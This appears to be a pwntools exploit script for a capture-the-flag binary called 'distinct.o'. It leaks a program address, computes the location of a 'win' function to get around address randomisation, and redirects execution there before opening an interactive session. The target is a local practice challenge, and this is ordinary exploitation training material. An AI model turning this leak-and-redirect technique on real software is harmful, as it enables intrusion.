from pwn import *

if args.REMOTE:
    p = remote('localhost', 9999)
else:
    p = process("./dist/distinct.o")
e = ELF("./dist/distinct.o")

def enter(num):
    p.sendlineafter(f'#', str(num))

for i in range(15):
    enter(0)
enter(2**64 - 1)

p.recvuntil('You have entered: \n')
result = p.recvline()
result = result.split(b' ')
unique = int(result[-2])
win = unique - e.symbols['unique'] + e.symbols['win']

success(f"unique = {hex(unique)}")
success(f"win = {hex(win)}")

p.sendlineafter("Enter Again? (Y/N) ", 'Y')

for i in range(15):
    enter(i)
enter(win)

p.sendlineafter("Enter Again? (Y/N) ", 'N')


p.interactive()